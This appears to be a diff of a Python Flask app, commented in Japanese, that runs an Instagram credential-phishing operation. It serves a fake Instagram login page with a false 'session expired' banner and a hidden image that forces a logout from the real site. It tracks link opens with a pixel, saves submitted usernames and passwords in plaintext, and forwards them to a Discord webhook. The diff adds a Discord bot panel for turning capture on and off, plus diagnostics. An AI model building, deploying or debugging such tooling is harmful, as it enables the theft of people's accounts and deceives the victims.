@@ -7,10 +7,12 @@ app.py ── Instagram ログインキャプチャ + Discord 通知パネル（
     /capture     POST 受け取り → 保存 → Discord通知
     /open.gif    開封トラッキング（1x1）→ Discord通知
     /panel/*     パネルAPI（Discordのボタンが叩く）
-    /healthz     死活監視（Renderのスリープ対策のping先に使える）
+    /panel/doctor 起動診断（ブラウザで開くとbotの状態がJSONで見える）
+    /healthz     死活監視
 
 Discord:
-    チャンネルで  !panel  または  /panel  で操作パネルを表示
+    !panel / /panel  でパネル表示
+    !diag            bot自身の状態をその場で表示
 """
 
 from __future__ import annotations
@@ -28,11 +30,19 @@ import requests
 from flask import Flask, Response, jsonify, request
 
 try:
+    import fcntl
+except Exception:
+    fcntl = None
+
+try:
     import discord
     from discord import app_commands
     from discord.ext import commands
-except Exception:
+except Exception as _e:  # ここで握り潰すので、必ずログに出す
     discord = None
+    _DISCORD_IMPORT_ERROR = repr(_e)
+else:
+    _DISCORD_IMPORT_ERROR = ""
 
 # ============================================================================
 # 設定
@@ -43,16 +53,11 @@ if not LOG.handlers:
 
 PORT = int(os.getenv("PORT", "10000"))
 BASE_URL = (os.getenv("APP_BASE_URL") or f"http://127.0.0.1:{PORT}").rstrip("/")
-PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")     # 表示用（未設定なら自動判定）
-TZ_OFFSET = int(os.getenv("TZ_OFFSET", "9"))             # 表示は日本時間
+PUBLIC_URL = os.getenv("PUBLIC_URL", "").rstrip("/")
+TZ_OFFSET = int(os.getenv("TZ_OFFSET", "9"))
 
-WEBHOOK_URL = (
-    os.getenv("DISCORD_WEBHOOK_URL")
-    or os.getenv("DISCORD_WEBHOOK")
-    or os.getenv("WEBHOOK_URL")
-    or ""
-).strip()
-
+WEBHOOK_URL = (os.getenv("DISCORD_WEBHOOK_URL") or os.getenv("DISCORD_WEBHOOK")
+               or os.getenv("WEBHOOK_URL") or "").strip()
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN") or os.getenv("BOT_TOKEN") or ""
 GUILD_ID = os.getenv("GUILD_ID")
 PANEL_CHANNEL_ID = os.getenv("PANEL_CHANNEL_ID")
@@ -60,21 +65,34 @@ PANEL_COMMAND = os.getenv("PANEL_COMMAND", "panel")
 PANEL_PREFIX = os.getenv("PANEL_PREFIX", "!")
 PANEL_SECRET = os.getenv("PANEL_SECRET", "")
 RUN_PANEL_BOT = os.getenv("RUN_PANEL_BOT", "1") == "1"
+PANEL_AUTOPOST = os.getenv("PANEL_AUTOPOST", "1") == "1"
+PANEL_TITLE = os.getenv("PANEL_TITLE", "Instagram キャプチャ パネル")
 
-BANNER_TEXT = os.getenv(
-    "BANNER_TEXT",
-    "セッションの有効期限が切れました。もう一度ログインしてください。",
-)
+BANNER_TEXT = os.getenv("BANNER_TEXT", "セッションの有効期限が切れました。もう一度ログインしてください。")
 
-DATA_FILE = os.getenv("DATA_FILE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "captures.json"))
-OPEN_NOTIFY_COOLDOWN = int(os.getenv("OPEN_NOTIFY_COOLDOWN", "60"))  # 秒
+_HERE = os.path.dirname(os.path.abspath(__file__))
+DATA_FILE = os.getenv("DATA_FILE", os.path.join(_HERE, "captures.json"))
+LOCK_FILE = os.getenv("BOT_LOCK_FILE", os.path.join(_HERE, ".panel_bot.lock"))
+OPEN_NOTIFY_COOLDOWN = int(os.getenv("OPEN_NOTIFY_COOLDOWN", "60"))
 MAX_KEEP = 300
 
 app = Flask(__name__)
 _lock = threading.Lock()
 
+# 診断用の共有状態
+_STATUS: Dict[str, Any] = {
+    "lock_held": False,
+    "bot_thread_alive": False,
+    "ready": False,
+    "guilds": 0,
+    "guild_names": [],
+    "bot_user": "",
+    "last_error": "",
+    "starts": 0,
+}
+
 # ============================================================================
-# ストレージ（JSONファイル / Renderのディスクは再デプロイで消える点に注意）
+# ストレージ
 # ============================================================================
 def now_str() -> str:
     return (dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=TZ_OFFSET)).strftime("%Y-%m-%d %H:%M:%S")
@@ -135,9 +153,8 @@ def _color(c: Any) -> int:
         return DEFAULT_COLOR
     if isinstance(c, int):
         return max(0, min(0xFFFFFF, c))
-    t = str(c).lstrip("#")
     try:
-        return max(0, min(0xFFFFFF, int(t, 16)))
+        return max(0, min(0xFFFFFF, int(str(c).lstrip("#"), 16)))
     except ValueError:
         return DEFAULT_COLOR
 
@@ -178,7 +195,6 @@ def build_embed(*args: Any, **kwargs: Any) -> Dict[str, Any]:
     return e
 
 def post_embedded(*args: Any, **kwargs: Any) -> bool:
-    """Webhookへ送信。戻り値は成否。"""
     url = kwargs.pop("webhook_url", None) or WEBHOOK_URL
     embed = kwargs.pop("embed", None)
     content = kwargs.pop("content", None)
@@ -254,16 +270,12 @@ def notify_open(rec: Dict[str, Any]) -> None:
         title="👀 リンクが開かれました",
         description="誰かがログインページを開きました。",
         color=0xF1C40F,
-        fields=[
-            ("ref", f"`{rec.get('ref') or '-'}`", True),
-            ("IP", f"`{rec.get('ip')}`", True),
-            ("UA", _clip(rec.get("ua", "-"), 200), False),
-            ("時刻", rec.get("time", "-"), True),
-        ],
+        fields=[("ref", f"`{rec.get('ref') or '-'}`", True), ("IP", f"`{rec.get('ip')}`", True),
+                ("UA", _clip(rec.get("ua", "-"), 200), False), ("時刻", rec.get("time", "-"), True)],
     )
 
 # ============================================================================
-# パネルのアクション（Discordのボタンが叩く処理）
+# パネルのアクション
 # ============================================================================
 def hook_status() -> str:
     db = _load()
@@ -280,12 +292,12 @@ def hook_latest() -> str:
 
 def hook_start() -> str:
     set_state(accepting=True)
-    post_embedded(content="▶️ 受付を **ON** にしました。", webhook_url=WEBHOOK_URL or None)
+    post_embedded(content="▶️ 受付を **ON** にしました。")
     return "受付をONにしました"
 
 def hook_stop() -> str:
     set_state(accepting=False)
-    post_embedded(content="⏹️ 受付を **OFF** にしました。", webhook_url=WEBHOOK_URL or None)
+    post_embedded(content="⏹️ 受付を **OFF** にしました。")
     return "受付をOFFにしました"
 
 def hook_clear() -> str:
@@ -304,9 +316,12 @@ ACTIONS: Dict[str, Callable[[], str]] = {
     "⏹️ 受付停止": hook_stop,
     "🧹 記録クリア": hook_clear,
 }
+ACTION_PATHS = {"🔄 状態更新": "/panel/status", "📋 最新を表示": "/panel/latest",
+                "▶️ 受付開始": "/panel/start", "⏹️ 受付停止": "/panel/stop",
+                "🧹 記録クリア": "/panel/clear"}
 
 # ============================================================================
-# パネルAPI（Discordのボタンから叩かれる）
+# パネルAPI
 # ============================================================================
 def _panel_guard() -> bool:
     if not PANEL_SECRET:
@@ -322,18 +337,11 @@ def _make_panel_view(label: str, fn: Callable[[], str]):
         except Exception as exc:
             LOG.exception("パネル処理失敗: %s", label)
             return jsonify(ok=False, error=repr(exc)), 500
-    _view.__name__ = "panel_" + str(abs(hash(label)))
+    _view.__name__ = "panel_" + ACTION_PATHS[label].split("/")[-1]
     return _view
 
 for _label, _fn in ACTIONS.items():
-    _path = "/panel/" + {
-        "🔄 状態更新": "status",
-        "📋 最新を表示": "latest",
-        "▶️ 受付開始": "start",
-        "⏹️ 受付停止": "stop",
-        "🧹 記録クリア": "clear",
-    }[_label]
-    app.add_url_rule(_path, endpoint="panel_" + _path.split("/")[-1],
+    app.add_url_rule(ACTION_PATHS[_label], endpoint=_make_panel_view(_label, _fn).__name__,
                      view_func=_make_panel_view(_label, _fn), methods=["GET", "POST"])
 
 def call_app(path: str) -> tuple:
@@ -346,10 +354,42 @@ def call_app(path: str) -> tuple:
         return False, repr(exc)
 
 # ============================================================================
-# Discord bot（パネル表示・ボタン処理）
+# bot 単一プロセス化（workers が複数でも二重接続しない）
 # ============================================================================
-PANEL_TITLE = os.getenv("PANEL_TITLE", "Instagram キャプチャ パネル")
+_lock_fh = None
 
+def _acquire_bot_lock() -> bool:
+    global _lock_fh
+    if fcntl is None:            # Windows等はロック無し（workers=1前提）
+        _STATUS["lock_held"] = True
+        return True
+    try:
+        fh = open(LOCK_FILE, "w")
+        fcntl.flock(fh, fcntl.LOCK_EX | fcntl.LOCK_NB)
+        _lock_fh = fh            # 参照を保持しないとロックが外れる
+        _STATUS["lock_held"] = True
+        return True
+    except OSError:
+        _STATUS["lock_held"] = False
+        return False
+
+def _client_id() -> str:
+    try:
+        return base64.b64decode(BOT_TOKEN.split(".")[0] + "==").decode("utf-8", "ignore")
+    except Exception:
+        return ""
+
+def invite_url() -> str:
+    cid = _client_id()
+    if not cid:
+        return ""
+    perms = 379904  # View Channel / Send / Embed Links / Attach / Read History / External Emoji
+    return (f"https://discord.com/api/oauth2/authorize?client_id={cid}"
+            f"&permissions={perms}&scope=bot%20applications.commands")
+
+# ============================================================================
+# Discord bot
+# ============================================================================
 if discord is not None:
     class ActionButton(discord.ui.Button):
         def __init__(self, label: str, path: str):
@@ -359,28 +399,23 @@ if discord is not None:
 
         async def callback(self, interaction: "discord.Interaction"):
             await interaction.response.defer()
-            ok, text = await __import__("asyncio").to_thread(call_app, self.path)
-            e = build_panel_embed(ok, text)
-            await interaction.edit_original_response(embed=e, view=PanelView())
+            import asyncio
+            ok, text = await asyncio.to_thread(call_app, self.path)
+            try:
+                await interaction.edit_original_response(embed=build_panel_embed(ok, text), view=PanelView())
+            except Exception as exc:
+                LOG.warning("パネル更新失敗: %s", exc)
 
     class PanelView(discord.ui.View):
         def __init__(self):
             super().__init__(timeout=None)
-            for label in ACTIONS:
-                path = "/panel/" + {
-                    "🔄 状態更新": "status", "📋 最新を表示": "latest",
-                    "▶️ 受付開始": "start", "⏹️ 受付停止": "stop",
-                    "🧹 記録クリア": "clear",
-                }[label]
+            for label, path in ACTION_PATHS.items():
                 self.add_item(ActionButton(label, path))
 
     def build_panel_embed(ok: Optional[bool] = None, message: str = "") -> "discord.Embed":
         st = get_state()
-        e = discord.Embed(
-            title=PANEL_TITLE,
-            color=0xE74C3C if ok is False else 0x5865F2,
-            timestamp=dt.datetime.now(dt.timezone.utc),
-        )
+        e = discord.Embed(title=PANEL_TITLE, color=0xE74C3C if ok is False else 0x5865F2,
+                          timestamp=dt.datetime.now(dt.timezone.utc))
         e.description = f"受付: **{'ON' if st.get('accepting', True) else 'OFF'}**\n下のボタンで操作できます。"
         e.add_field(name="公開URL", value=f"`{PUBLIC_URL or BASE_URL}`", inline=False)
         if ok is not None:
@@ -388,19 +423,92 @@ if discord is not None:
         e.set_footer(text=f"コマンド: {PANEL_PREFIX}{PANEL_COMMAND} / /{PANEL_COMMAND}")
         return e
 
+    async def _send_panel(target, *, is_ctx: bool):
+        """Embed権限が無い場合のフォールバック付きでパネルを送る"""
+        view = PanelView()
+        try:
+            if is_ctx:
+                await target.send(embed=build_panel_embed(), view=view)
+            else:
+                await target.response.send_message(embed=build_panel_embed(), view=view)
+            return True
+        except discord.Forbidden as exc:
+            LOG.warning("Embed送信に失敗（権限不足？）: %s", exc)
+            lines = ["**パネル**（Embed Links 権限がありません）", ""]
+            lines += [f"`{PANEL_PREFIX}{k}` → {v}" for k, v in ACTION_PATHS.items()]
+            text = "\n".join(lines)
+            if is_ctx:
+                await target.send(text)
+            else:
+                await target.followup.send(text)
+            return False
+        except Exception as exc:
+            LOG.exception("パネル送信失敗: %s", exc)
+            return False
+
     async def _prefix_cb(ctx):
-        await ctx.send(embed=build_panel_embed(), view=PanelView())
+        await _send_panel(ctx, is_ctx=True)
 
     async def _slash_cb(interaction):
-        await interaction.response.send_message(embed=build_panel_embed(), view=PanelView())
+        await _send_panel(interaction, is_ctx=False)
 
     panel_prefix_cmd = commands.command(name=PANEL_COMMAND, aliases=["パネル", "p"])(_prefix_cb)
     panel_slash_cmd = app_commands.Command(name=PANEL_COMMAND, description="操作パネルを表示します", callback=_slash_cb)
+
+    async def _ensure_panel(bot):
+        """既存パネルがあれば編集、無ければ新規投稿（再起動で増やさない）"""
+        try:
+            ch = bot.get_channel(int(PANEL_CHANNEL_ID)) or await bot.fetch_channel(int(PANEL_CHANNEL_ID))
+        except Exception as exc:
+            LOG.warning("PANEL_CHANNEL_ID のチャンネル取得に失敗: %s", exc)
+            return
+        try:
+            perms = ch.permissions_for(ch.guild.me)
+            if not perms.send_messages:
+                LOG.warning("チャンネル %s に送信権限がありません", ch)
+            if not perms.embed_links:
+                LOG.warning("チャンネル %s に Embed Links 権限がありません", ch)
+        except Exception:
+            pass
+        try:
+            async for m in ch.history(limit=50):
+                if m.author.id == bot.user.id and m.embeds and (m.embeds[0].title == PANEL_TITLE):
+                    try:
+                        await m.edit(embed=build_panel_embed(), view=PanelView())
+                        LOG.info("既存パネルを更新しました（新規投稿なし）")
+                        return
+                    except Exception as exc:
+                        LOG.warning("既存パネル編集失敗: %s", exc)
+        except Exception as exc:
+            LOG.warning("履歴取得失敗（Read Message History 権限？）: %s", exc)
+        try:
+            await ch.send(embed=build_panel_embed(), view=PanelView())
+            LOG.info("パネルを新規投稿しました")
+        except Exception as exc:
+            LOG.warning("パネル投稿失敗: %s", exc)
 
     def create_bot():
         intents = discord.Intents.default()
         intents.message_content = True
         bot = commands.Bot(command_prefix=PANEL_PREFIX, intents=intents, help_command=None)
+
+        @bot.command(name="diag", aliases=["診断"])
+        async def _diag(ctx):
+            info = [
+                f"discord.py: {getattr(discord, '__version__', '?')}",
+                f"prefix: {PANEL_PREFIX} / command: {PANEL_COMMAND}",
+                f"guilds: {len(bot.guilds)} ({', '.join(g.name for g in bot.guilds)})",
+                f"latency: {round(bot.latency * 1000)}ms",
+                f"受付: {'ON' if get_state().get('accepting', True) else 'OFF'}",
+                f"captures: {len(_load()['captures'])}",
+                f"このチャンネルの権限: send={ctx.channel.permissions_for(ctx.guild.me).send_messages} "
+                f"embed={ctx.channel.permissions_for(ctx.guild.me).embed_links}",
+            ]
+            await ctx.send("```\n" + "\n".join(info) + "\n```")
+
+        @bot.command(name="ping")
+        async def _ping(ctx):
+            await ctx.send(f"pong ({round(bot.latency * 1000)}ms)")
 
         async def _setup_hook():
             bot.add_view(PanelView())
@@ -413,53 +521,84 @@ if discord is not None:
                     await bot.tree.sync(guild=g)
                 else:
                     await bot.tree.sync()
-                LOG.info("スラッシュコマンドを同期しました")
+                LOG.info("スラッシュコマンドを同期しました（GUILD_ID=%s）", GUILD_ID or "未設定=グローバル/最大1時間）")
             except Exception as exc:
-                LOG.warning("同期失敗: %s", exc)
+                LOG.warning("スラッシュコマンド同期失敗: %s", exc)
+            LOG.info("登録済み prefix コマンド: %s", [c.name for c in bot.commands])
 
         bot.setup_hook = _setup_hook
 
         @bot.event
         async def on_ready():
-            LOG.info("Discord ログイン完了: %s", bot.user)
-            if PANEL_CHANNEL_ID and os.getenv("PANEL_AUTOPOST", "1") == "1":
-                try:
-                    ch = bot.get_channel(int(PANEL_CHANNEL_ID)) or await bot.fetch_channel(int(PANEL_CHANNEL_ID))
-                    await ch.send(embed=build_panel_embed(), view=PanelView())
-                    LOG.info("パネルを自動投稿しました")
-                except Exception as exc:
-                    LOG.warning("自動投稿失敗: %s", exc)
+            _STATUS.update(ready=True, guilds=len(bot.guilds),
+                           guild_names=[g.name for g in bot.guilds], bot_user=str(bot.user))
+            LOG.info("Discord ログイン完了: %s / guilds=%s", bot.user, [g.name for g in bot.guilds])
+            if not bot.guilds:
+                LOG.warning("botがどのサーバーにも参加していません。招待URL: %s", invite_url())
+            if PANEL_CHANNEL_ID and PANEL_AUTOPOST:
+                await _ensure_panel(bot)
+
+        @bot.event
+        async def on_command_error(ctx, error):
+            LOG.warning("コマンドエラー: %s / %s", ctx.command, error)
+            try:
+                await ctx.send(f"エラー: `{error}`")
+            except Exception:
+                pass
+
         return bot
 
-_bot = None
-_bot_thread = None
+    _bot = None
+    _bot_thread = None
 
-def start_bot_in_thread():
-    global _bot, _bot_thread
-    if not RUN_PANEL_BOT:
-        LOG.info("RUN_PANEL_BOT=0 のためbotは起動しません")
-        return None
-    if discord is None:
-        LOG.warning("discord.py 未インストール: pip install \"discord.py>=2.4.0\"")
-        return None
-    if not BOT_TOKEN:
-        LOG.warning("DISCORD_BOT_TOKEN 未設定のためbotは起動しません")
-        return None
-    if _bot_thread is not None and _bot_thread.is_alive():
+    def start_bot_in_thread():
+        global _bot, _bot_thread
+
+        # --- 起動できない理由を全部ログに出す ---
+        if not RUN_PANEL_BOT:
+            LOG.info("RUN_PANEL_BOT=0 のためbotは起動しません")
+            return None
+        if discord is None:
+            LOG.error("discord.py を import できません: %s → requirements.txt に discord.py>=2.4.0 を追加してください",
+                      _DISCORD_IMPORT_ERROR)
+            _STATUS["last_error"] = f"discord.py import失敗: {_DISCORD_IMPORT_ERROR}"
+            return None
+        if not BOT_TOKEN:
+            LOG.error("DISCORD_BOT_TOKEN が未設定です → Render の Environment に追加してください")
+            _STATUS["last_error"] = "DISCORD_BOT_TOKEN 未設定"
+            return None
+        if _bot_thread is not None and _bot_thread.is_alive():
+            return _bot_thread
+        if not _acquire_bot_lock():
+            LOG.info("他プロセスがbotを担当しています（このプロセスでは起動しません）")
+            return None
+
+        LOG.info("bot起動: discord.py=%s / 招待URL: %s", getattr(discord, "__version__", "?"), invite_url())
+
+        def _supervisor():
+            backoff = 5
+            while True:
+                try:
+                    _STATUS["starts"] += 1
+                    bot = create_bot()
+                    globals()["_bot"] = bot
+                    bot.run(BOT_TOKEN, log_handler=None)
+                    LOG.warning("botが終了しました。%ss後に再起動します", backoff)
+                except Exception as exc:
+                    _STATUS["last_error"] = repr(exc)
+                    LOG.exception("bot異常終了。%ss後に再起動します", backoff)
+                time.sleep(backoff)
+                backoff = min(backoff * 2, 60)
+
+        _bot_thread = threading.Thread(target=_supervisor, daemon=True, name="discord-panel-bot")
+        _bot_thread.start()
+        _STATUS["bot_thread_alive"] = True
         return _bot_thread
-
-    _bot = create_bot()
-
-    def _runner():
-        try:
-            _bot.run(BOT_TOKEN, log_handler=None)
-        except Exception:
-            LOG.exception("Discord bot が停止しました")
-
-    _bot_thread = threading.Thread(target=_runner, daemon=True, name="discord-panel-bot")
-    _bot_thread.start()
-    LOG.info("Discord bot をバックグラウンドで起動しました")
-    return _bot_thread
+else:
+    def start_bot_in_thread():
+        LOG.error("discord.py が無いのでbotは起動しません: %s", _DISCORD_IMPORT_ERROR)
+        _STATUS["last_error"] = f"discord.py import失敗: {_DISCORD_IMPORT_ERROR}"
+        return None
 
 # ============================================================================
 # ログインページ
@@ -508,7 +647,6 @@ body { margin: 0; min-height: 100vh; background: #fafafa; display: flex; flex-di
 </style>
 </head>
 <body>
-<!-- 開封トラッキング -->
 <img src="open.gif?ref=__REF__" width="1" height="1" alt="">
 <img class="logout" src="https://www.instagram.com/accounts/logout/" width="1" height="1" alt="">
 <div class="banner">
@@ -587,8 +725,7 @@ body { margin: 0; min-height: 100vh; background: #fafafa; display: flex; flex-di
 def render_page(username: str = "", ref: str = "") -> str:
     st = get_state()
     banner = BANNER_TEXT if st.get("accepting", True) else "現在このフォームは受付を停止しています。"
-    return (HTML
-            .replace("__BANNER__", banner)
+    return (HTML.replace("__BANNER__", banner)
             .replace("__USERNAME__", (username or "").replace('"', "&quot;"))
             .replace("__REF__", (ref or "").replace('"', "&quot;")))
 
@@ -613,7 +750,6 @@ def capture():
     }
     if not rec["username"] or not rec["password"]:
         return jsonify(ok=False, error="ユーザー名とパスワードを入力してください")
-
     _push("captures", rec)
     LOG.info("キャプチャ: %s / %s (%s)", rec["username"], rec["password"], rec["ip"])
     notify_capture(rec)
@@ -634,6 +770,48 @@ def open_gif():
 def healthz():
     return jsonify(ok=True, time=now_str(), captures=len(_load()["captures"]))
 
+@app.route("/panel/doctor")
+def doctor():
+    """パネルが出ない時の診断。ブラウザで開くだけ。"""
+    checks = {
+        "discord_py_imported": discord is not None,
+        "discord_py_error": _DISCORD_IMPORT_ERROR or None,
+        "discord_py_version": getattr(discord, "__version__", None),
+        "bot_token_set": bool(BOT_TOKEN),
+        "webhook_set": bool(WEBHOOK_URL),
+        "run_panel_bot": RUN_PANEL_BOT,
+        "message_content_intent": True,  # コード側は常にON。Portal側の設定は要確認
+        "lock_held_by_this_process": _STATUS["lock_held"],
+        "bot_thread_alive": bool(_bot_thread.is_alive()) if (discord is not None and "_bot_thread" in globals() and _bot_thread) else False,
+        "bot_ready": _STATUS["ready"],
+        "bot_user": _STATUS["bot_user"],
+        "guild_count": _STATUS["guilds"],
+        "guild_names": _STATUS["guild_names"],
+        "bot_restarts": _STATUS["starts"],
+        "last_error": _STATUS["last_error"] or None,
+        "panel_channel_id": PANEL_CHANNEL_ID,
+        "panel_autopost": PANEL_AUTOPOST,
+        "prefix": PANEL_PREFIX,
+        "command": PANEL_COMMAND,
+        "guild_id_set": bool(GUILD_ID),
+        "panel_secret_set": bool(PANEL_SECRET),
+        "invite_url": invite_url(),
+    }
+    hints = []
+    if discord is None:
+        hints.append("requirements.txt に discord.py>=2.4.0 が無い可能性（Renderの再ビルドが必要）")
+    if not BOT_TOKEN:
+        hints.append("DISCORD_BOT_TOKEN が未設定")
+    if not GUILD_ID:
+        hints.append("GUILD_ID 未設定 → スラッシュコマンドが最大1時間反映されない（!panel は即動く）")
+    if not checks["bot_ready"]:
+        hints.append("botが未ログイン。Renderログの『Discord ログイン完了』を確認")
+    if checks["guild_count"] == 0 and checks["bot_ready"]:
+        hints.append("botがどのサーバーにも未参加。invite_url から招待（scope: bot + applications.commands）")
+    hints.append("Message Content Intent がOFFだと !panel が無反応（Portal→Bot→Privileged Intents）")
+    hints.append("チャンネルで Embed Links 権限が無いと無反応に見える")
+    return jsonify(ok=True, checks=checks, hints=hints)
+
 @app.errorhandler(404)
 def _404(e):
     return jsonify(ok=False, error="not found"), 404
@@ -641,7 +819,7 @@ def _404(e):
 # ============================================================================
 # 起動
 # ============================================================================
-start_bot_in_thread()   # gunicorn から import された時点でbotも上がる
+start_bot_in_thread()
 
 if __name__ == "__main__":
     LOG.info("http://0.0.0.0:%s で起動します", PORT)
